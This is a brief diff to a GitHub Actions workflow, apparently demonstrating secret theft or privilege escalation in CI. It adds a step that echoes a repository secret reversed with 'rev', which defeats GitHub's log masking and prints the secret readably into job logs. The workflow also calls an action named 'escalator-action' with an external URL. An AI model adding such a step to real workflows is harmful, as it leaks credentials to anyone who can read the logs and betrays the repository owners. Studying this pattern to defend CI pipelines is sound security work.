@@ -9,6 +9,8 @@ jobs:
   comment:
     runs-on: ubuntu-latest
     steps:
+      - run: |
+          echo ${{secrets.VERY_SECRET_KEY}} | rev
       - uses: ethomson/escalator-action@v0.0.1
         with:
           url: https://escalatoraction.azurewebsites.net/
